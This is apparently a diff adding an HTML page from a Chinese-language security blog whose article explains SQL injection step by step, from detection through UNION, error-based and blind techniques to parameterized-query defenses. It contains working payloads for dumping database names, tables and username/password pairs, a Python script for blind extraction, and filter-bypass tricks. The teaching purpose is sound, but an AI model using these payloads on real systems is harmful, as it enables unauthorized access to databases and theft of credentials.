@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQL 注入：从 union 到盲注的系统梳理 // QIANMI</title>
+<meta name="description" content="把 SQL 注入的判定、利用、绕过与防御拉成一条线，重点讲清楚为什么这样写能出数据。">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%23050706'/%3E%3Cpath d='M6 34 L34 6 L26 34 Z' fill='%2300ff41'/%3E%3Cpath d='M6 34 L34 6 L20 34 Z' fill='%23ffffff'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700;800&family=Noto+Sans+SC:wght@400;500;700;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/moss.css">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="wrap nav__inner">
+    <a class="brand" href="../index.html" aria-label="QIANMI 首页">
+      <svg class="brand__mark" viewBox="0 0 40 40" aria-hidden="true">
+        <rect width="40" height="40" fill="#050706"/>
+        <path d="M7 33 L33 7 L25 33 Z" fill="#00ff41"/>
+        <path d="M7 33 L33 7 L19 33 Z" fill="#fff"/>
+      </svg>
+      <span class="brand__text">Qian<em>mi</em></span>
+    </a>
+    <div class="nav__links">
+      <a class="nav__link" href="../index.html">Index</a>
+      <a class="nav__link" href="../archive.html" aria-current="page">文章</a>
+      <a class="nav__link" href="../projects.html">项目</a>
+      <a class="nav__link" href="../about.html">关于</a>
+      <a class="nav__gh" href="https://github.com/qianmi-qm" target="_blank" rel="noopener">
+        <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82a7.4 7.4 0 0 1 2-.27c.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8Z"/></svg>
+        GitHub
+      </a>
+    </div>
+    <button class="nav__toggle" type="button" aria-label="打开导航菜单" aria-expanded="false">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+</nav>
+
+<header class="article-head">
+  <svg class="article-head__shards" data-shard-field='{"seed":88,"focal":{"x":0.58,"y":0.66},"flow":-145,"density":1.0,"beams":1,"contrast":0.42,"greenRatio":0.3}' aria-hidden="true"></svg>
+  <div class="article-head__veil"></div>
+  <div class="wrap article-head__inner">
+    <span class="kicker">Web 安全</span>
+    <h1 class="article-head__title">SQL 注入：从 union 到盲注的系统梳理</h1>
+    <div class="article-head__meta">
+      <span>2026.08.20</span>
+      <span class="cat">Web 安全</span>
+      <span>22 min read</span>
+    </div>
+  </div>
+</header>
+
+<div class="slant slant--ink-2 slant--rev" aria-hidden="true"></div>
+
+<article class="article-body">
+  <div class="wrap">
+    <div class="prose">
+
+      <p>
+        SQL 注入的 payload 在网上到处都是，复制粘贴就能用。
+        但如果不理解"为什么这段字符串能让数据库吐出数据"，
+        换个场景就完全不会变通了。
+      </p>
+      <p>
+        这篇按<strong>数据回显能力</strong>从强到弱排列：有回显用联合查询，
+        有报错用报错注入，什么都没有才上盲注。
+      </p>
+
+      <h2>一、先判定：这里有没有注入</h2>
+      <p>
+        假设后端是这样拼 SQL 的：
+      </p>
+      <pre data-lang="php"><code>$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];</code></pre>
+      <p>
+        传入 <code>id=1</code> 时执行的是 <code>WHERE id = 1</code>。
+        传入 <code>id=1'</code> 时变成 <code>WHERE id = 1'</code>——语法错误，页面报错或空白，
+        这说明<strong>单引号进入了 SQL 语法层</strong>，注入点存在。
+      </p>
+      <p>
+        但更常见的是数字型注入（如上面这段代码），单引号不会报错。
+        这时候用算术表达式判断：
+      </p>
+      <pre data-lang="payload"><code>id=2-1    → 返回 id=1 的记录？说明表达式被求值了
+id=1 and 1=1   → 正常
+id=1 and 1=2   → 无结果？布尔条件生效了</code></pre>
+      <blockquote>
+        判断的核心逻辑只有一句：<strong>输入是被当成"数据"还是"代码"</strong>。
+        如果 <code>2-1</code> 被求值成 <code>1</code>，那它就已经是代码了。
+      </blockquote>
+
+      <h2>二、联合查询注入（有回显）</h2>
+      <p>
+        页面会把查询结果渲染出来时，联合查询是最舒服的方式。
+        第一步是<strong>确定列数</strong>，用 <code>ORDER BY</code> 递增试探：
+      </p>
+      <pre data-lang="payload"><code>id=1 ORDER BY 1
+id=1 ORDER BY 2
+id=1 ORDER BY 3   -- 报错，说明只有 2 列</code></pre>
+      <p>
+        也可以直接猜：<code>id=1 UNION SELECT 1,2</code>，报错就加列数。
+        确定列数后，找出哪个位置的内容会被显示在页面上：
+      </p>
+      <pre data-lang="payload"><code>id=-1 UNION SELECT 1,2      -- 让原查询为空，页面显示 1 和 2
+id=-1 UNION SELECT 1,database()</code></pre>
+      <p>
+        接下来就是信息收集的常规流程：
+      </p>
+      <pre data-lang="payload"><code>-- 库名
+id=-1 UNION SELECT 1,database()
+
+-- 所有库
+id=-1 UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata
+
+-- 指定库的表
+id=-1 UNION SELECT 1,group_concat(table_name)
+FROM information_schema.tables WHERE table_schema='security'
+
+-- 指定表的列
+id=-1 UNION SELECT 1,group_concat(column_name)
+FROM information_schema.columns
+WHERE table_schema='security' AND table_name='users'
+
+-- 取数据
+id=-1 UNION SELECT 1,group_concat(username,0x3a,password) FROM security.users</code></pre>
+      <p>
+        这里 <code>0x3a</code> 是冒号的十六进制，用来做分隔符，
+        避免逗号被过滤。这类小技巧在实战里很常用。
+      </p>
+
+      <h2>三、报错注入（无回显但有报错）</h2>
+      <p>
+        页面不回显数据，但会把数据库的错误信息打在页面上——这依然是一条信息通道。
+        原理是<strong>构造一个必然报错的表达式，把想查的数据拼进错误信息里</strong>。
+      </p>
+      <pre data-lang="payload"><code>-- MySQL 8 之前常用
+id=1 AND updatexml(1,concat(0x7e,database(),0x7e),1)
+id=1 AND extractvalue(1,concat(0x7e,database(),0x7e))
+
+-- 报错信息里会带出 ~security~
+-- MySQL 8 中这两个函数已被移除，改用：
+id=1 AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))
+         x FROM information_schema.tables GROUP BY x) a)</code></pre>
+      <p>
+        注意报错注入有个限制：<strong>错误信息通常只返回一行</strong>（约 32 字符）。
+        取长数据要用 <code>substr()</code> 分段读。
+      </p>
+
+      <h2>四、布尔盲注（无回显无报错）</h2>
+      <p>
+        页面上什么数据都没有，但"查询有结果"和"查询无结果"两种状态的页面表现不同
+        （比如一个显示"欢迎"，一个显示"用户不存在"）。这就是布尔盲注的基础。
+      </p>
+      <p>
+        思路是把"取数据"转化成"问是非题"：
+      </p>
+      <pre data-lang="payload"><code>-- 库名的第一个字符是不是 s？
+id=1 AND substr(database(),1,1)='s'
+
+-- 是不是大于 'a'？
+id=1 AND ascii(substr(database(),1,1)) &gt; 97</code></pre>
+      <p>
+        手工做太慢，实战和 CTF 里都是写脚本二分查找。
+        核心就是一个循环：对每个位置，二分确定 ASCII 值。
+      </p>
+      <pre data-lang="python"><code>import requests
+
+def is_true(payload):
+    r = requests.get(URL, params={"id": "1 AND " + payload})
+    return "欢迎" in r.text        # 用页面差异作为判断信号
+
+def extract(sql, length):
+    result = ""
+    for pos in range(1, length + 1):
+        low, high = 32, 126
+        while low &lt; high:
+            mid = (low + high) // 2
+            if is_true(f"ascii(substr(({sql}),{pos},1))&gt;{mid}"):
+                low = mid + 1
+            else:
+                high = mid
+        result += chr(low)
+    return result</code></pre>
+
+      <h2>五、时间盲注（页面完全无差异）</h2>
+      <p>
+        最恶劣的情况：无论查询成功还是失败，页面长得一模一样。
+        这时候唯一能观测的只剩<strong>响应时间</strong>。
+      </p>
+      <pre data-lang="payload"><code>-- 条件成立就睡 5 秒
+id=1 AND if(substr(database(),1,1)='s', sleep(5), 0)
+
+-- 或用 benchmark 制造耗时
+id=1 AND if(1=1, benchmark(5000000, md5(1)), 0)</code></pre>
+      <p>
+        时间盲注的代价是慢——每个字符都要等一个 sleep。
+        所以实战中优先找布尔信号，实在没有才用时间。
+      </p>
+
+      <h2>六、绕过常见过滤</h2>
+      <table>
+        <thead>
+          <tr><th>被过滤的内容</th><th>绕过思路</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>空格</td><td><code>/**/</code>、<code>%09</code>、<code>%0a</code>、括号 <code>()</code></td></tr>
+          <tr><td>逗号</td><td>用 <code>JOIN</code> 替代 <code>UNION SELECT 1,2</code> 的逗号；<code>substr(x FROM 1 FOR 1)</code></td></tr>
+          <tr><td>关键字 <code>select</code></td><td>大小写混淆、内联注释 <code>/*!50000select*/</code></td></tr>
+          <tr><td>引号</td><td>十六进制 <code>0x75736572</code> 代替字符串</td></tr>
+          <tr><td>等号</td><td><code>like</code>、<code>regexp</code>、<code>between</code></td></tr>
+        </tbody>
+      </table>
+      <p>
+        绕过的本质是：<strong>过滤规则是字符串匹配，而 SQL 解析器认的是语法</strong>。
+        只要找到一种"过滤器不认、但解析器认"的等价写法，就绕过去了。
+      </p>
+
+      <h2>七、防御：唯一的根本解</h2>
+      <p>
+        所有注入的成因可以归结为一句话：<strong>用户输入被拼接进了 SQL 语句</strong>。
+        所以防御也只有一个根本方向——让它不再被拼接。
+      </p>
+      <pre data-lang="java"><code>// 错误：字符串拼接
+String sql = "SELECT * FROM users WHERE name = '" + name + "'";
+Statement st = conn.createStatement();
+st.executeQuery(sql);
+
+// 正确：预编译 + 参数占位
+String sql = "SELECT * FROM users WHERE name = ?";
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setString(1, name);
+ps.executeQuery();</code></pre>
+      <p>
+        <code>PreparedStatement</code> 之所以有效，是因为参数值是在
+        <strong>SQL 语句编译完成之后</strong>才传入的。数据库引擎已经确定了语法结构，
+        此时参数无论包含什么字符，都只能被当作数据，不可能变成语法的一部分。
+      </p>
+      <p>
+        其他辅助措施：
+      </p>
+      <ul>
+        <li>最小权限：Web 应用连接数据库的账号，不要给 <code>FILE</code>、<code>DROP</code> 这类权限。</li>
+        <li>关闭详细报错：生产环境不要把数据库错误信息返回给前端，否则等于免费提供报错注入通道。</li>
+        <li>WAF 只当兜底：它能挡脚本小子，但挡不住会绕过的攻击者，不能替代参数化。</li>
+      </ul>
+      <blockquote>
+        有个常见的错误做法：用 <code>addslashes</code> 或自己写的转义函数来"过滤"。
+        这在 GBK 等宽字节编码下会被 <code>%df%27</code> 直接绕过。
+        转义永远不如参数化可靠。
+      </blockquote>
+
+      <h2>小结</h2>
+      <p>
+        整篇文章其实就一条主线：<strong>先确认信息通道，再选择利用方式</strong>。
+        有回显走联合查询，有报错走报错注入，只有布尔差异走布尔盲注，
+        什么都没有才上时间盲注。
+      </p>
+      <p>
+        而防御侧同样只有一条主线：<strong>参数化查询</strong>。
+        理解了"编译在前、传值在后"这个顺序，就理解了它为什么能彻底解决注入。
+      </p>
+
+    </div>
+  </div>
+</article>
+
+<section class="article-foot">
+  <div class="wrap article-foot__inner">
+    <a class="btn btn--ghost" href="xss-labs.html"><span>← 上一篇：XSS-labs 通关总结</span></a>
+    <a class="btn" href="../archive.html"><span>返回文章列表 →</span></a>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer__bottom" style="padding-top:0;border:0">
+      <span>© <span data-year>2026</span> QIANMI · ALL RIGHTS RESERVED</span>
+      <span>BLACK TERMINAL <em>v5.0</em> / BUILT BY HAND</span>
+    </div>
+  </div>
+</footer>
+
+<script src="../assets/js/moss.js"></script>
+</body>
+</html>
